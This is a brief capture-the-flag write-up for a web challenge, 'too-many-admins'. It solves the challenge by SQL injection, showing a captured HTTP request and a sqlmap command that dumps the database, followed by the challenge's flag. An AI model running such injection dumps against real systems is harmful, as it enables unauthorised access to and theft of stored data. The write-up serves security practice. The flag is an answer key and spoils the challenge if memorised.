# web/too-many-admins

Too many admins spoil the broth. Can you login as the right admin and get the flag ?

http://34.132.132.69:8000/

Downloads: [public.zip](./public.zip)

## Solution

SQL injection attack, both GET and POST can be attacked using `sqlmap`.

```http
GET /?user=all HTTP/1.1
Host: 34.132.132.69:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://34.132.132.69:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.132.132.69:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

Use command:

```bash
sqlmap -r r.txt --answer=Y --dump
```

## Flag

```plaintext
flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}
```

